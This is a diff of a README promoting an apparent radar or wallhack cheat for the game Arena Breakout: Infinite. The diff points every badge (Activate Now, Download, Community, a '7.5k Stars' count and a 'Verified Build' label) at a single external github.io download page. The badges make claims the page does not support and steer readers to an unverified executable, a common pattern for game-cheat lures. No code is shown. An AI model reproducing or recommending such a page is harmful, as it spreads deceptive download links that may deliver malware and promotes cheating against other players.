@@ -30,10 +30,10 @@ Use strictly for **offline/custom play**. Enabling radar in competitive servers 
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-🔥-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.5k Stars](https://img.shields.io/badge/GitHub-⭐️%207.5k%20Stars-black?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-🔥-red?style=for-the-badge\&logo=rocket)](https://arena-breakout-infinite-radar-vision.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://arena-breakout-infinite-radar-vision.github.io/.github/)
+[![⭐️ 7.5k Stars](https://img.shields.io/badge/GitHub-⭐️%207.5k%20Stars-black?style=for-the-badge\&logo=github)](https://arena-breakout-infinite-radar-vision.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](https://arena-breakout-infinite-radar-vision.github.io/.github/)
 
 <img width="1280" height="685" alt="image" src="https://github.com/user-attachments/assets/8b27e4eb-700e-4165-a09f-87243257a248" />
 
@@ -113,8 +113,8 @@ A: Not recommended—safe for offline/custom use only.
 
 The **Arena Breakout: Infinite Radar Vision Tool** is ideal for players who want to **train routes, plan raids, and boost situational awareness**. With clear overlays for enemies, loot, and objectives, it gives you the tactical clarity to dominate every encounter.
 
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?style=for-the-badge\&logo=discord)](#)
-[![Verified Build](https://img.shields.io/badge/Build-Verified-success?style=for-the-badge\&logo=checkmarx)](#)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](https://arena-breakout-infinite-radar-vision.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?style=for-the-badge\&logo=discord)](https://arena-breakout-infinite-radar-vision.github.io/.github/)
+[![Verified Build](https://img.shields.io/badge/Build-Verified-success?style=for-the-badge\&logo=checkmarx)](https://arena-breakout-infinite-radar-vision.github.io/.github/)
 
 ---
